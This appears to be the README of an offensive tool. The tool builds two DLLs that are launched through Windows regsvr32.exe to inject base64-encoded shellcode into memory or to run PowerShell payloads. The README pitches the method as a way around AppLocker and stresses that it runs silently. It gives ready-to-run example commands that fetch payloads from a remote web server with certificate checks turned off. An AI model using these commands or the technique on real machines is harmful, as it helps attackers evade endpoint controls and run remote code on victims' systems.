This project compiles two Dynamic Link Libraries to be used with the "regsvr32.exe" Windows command.
The Windows *regsrv32.exe* command is used to register and unregister DLL's in the Windows registry.   Because it is frequently used, this command is rarely (if ever) blacklisted by Windows "AppLocker". 

Using a combination of the DLL's contained within this project, and the *regsvr32* Windows command, the user of these DLL's can either inject shellcode into memory, or run a PowerShell script by passing appropriate arguments to the "DllInstall()" routine contained within the code.

Any payloads used with this project must be base64 encoded, no matter whether the payload is a PowerShell script, or a binary shellcode.   In the case of shellcode, the system architecture must match.  In other words use either *rs32.dll* or *rs64.dll* depending on whether you have a 32-bit or 64-bit system target.

Payloads can additionally be hosted on a web server and will be read directly from the URL without any TLS/SSL certificate validation.  

Note that you will never be able to troubleshoot errors using this method.   It is completely silent by design.
Additionally, by adding the "/s" flag with *regsvr32.exe*, you are suppressing any dialog popups which are not going to be useful anyway.


Example Usage:

    C:\> regsvr32.exe /s /i:shellcode,payload-32bit.b64 rs32.dll

    C:\> regsvr32.exe /s /i:shellcode,payload-64bit.b64 rs64.dll
    
    C:\> regsvr32.exe /s /i:powershell,script-payload.b64 rs32.dll

    C:\> regsvr32.exe /s /i:shellcode,https://10.10.10.10/payload.b64 rs64.dll

    C:\> regsvr32.exe /s /i:powershell,http://10.10.10.10/pspayload.b64 rs64.dll
    
